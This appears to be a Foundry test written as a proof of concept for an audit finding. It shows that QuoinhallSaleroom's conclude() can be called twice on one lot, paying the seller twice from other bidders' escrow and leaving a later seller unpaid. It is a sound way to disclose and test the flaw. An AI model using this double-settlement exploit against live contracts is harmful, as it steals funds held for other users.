// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {QuoinhallSaleroom} from "../src/QuoinhallSaleroom.sol";

contract MockERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external {}
}

contract ConcludeStealPoC is Test {
    QuoinhallSaleroom saleroom;
    MockERC721 mockNft;

    address mallory = address(0x111);
    address bob = address(0x222);
    address alice = address(0x333);
    address carol = address(0x444);

    function setUp() public {
        saleroom = new QuoinhallSaleroom(address(this), 200); // 2% fee
        mockNft = new MockERC721();
        vm.deal(alice, 10 ether);
        vm.deal(carol, 10 ether);
    }

    function test_doubleConclude() public {
        // Lot 1: seller mallory, 1 day; alice wins at 4 ether
        vm.prank(mallory);
        uint256 lot1 = saleroom.consign(address(mockNft), 1, 1 ether, 1 days);
        vm.prank(alice);
        saleroom.placeOffer{value: 4 ether}(lot1);

        // Lot 2: seller bob, 3 days; carol leads at 6 ether
        vm.prank(bob);
        uint256 lot2 = saleroom.consign(address(mockNft), 2, 1 ether, 3 days);
        vm.prank(carol);
        saleroom.placeOffer{value: 6 ether}(lot2);

        assertEq(address(saleroom).balance, 10 ether);

        vm.warp(block.timestamp + 2 days); // Lot 1 closed, Lot 2 still open

        uint256 malloryBalBefore = mallory.balance;

        // Conclude lot 1 first time
        saleroom.conclude(lot1);
        uint256 payout = 4 ether - (4 ether * 200 / 10000); // 3.92 ether
        assertEq(mallory.balance, malloryBalBefore + payout);
        console2.log("Saleroom balance after 1st conclude:", address(saleroom).balance);

        // Conclude lot 1 AGAIN
        saleroom.conclude(lot1);
        assertEq(mallory.balance, malloryBalBefore + 2 * payout);

        console2.log("Mallory received in total:", mallory.balance - malloryBalBefore);
        console2.log("Saleroom balance after 2nd conclude:", address(saleroom).balance);

        assertEq(address(saleroom).balance, 10 ether - 2 * payout); // 2.16 ether

        vm.warp(block.timestamp + 2 days); // Lot 2 closes

        vm.expectRevert(QuoinhallSaleroom.PayoutFailed.selector);
        saleroom.conclude(lot2); // bob is owed 5.88 ether but only 2.16 ether remains
    }
}
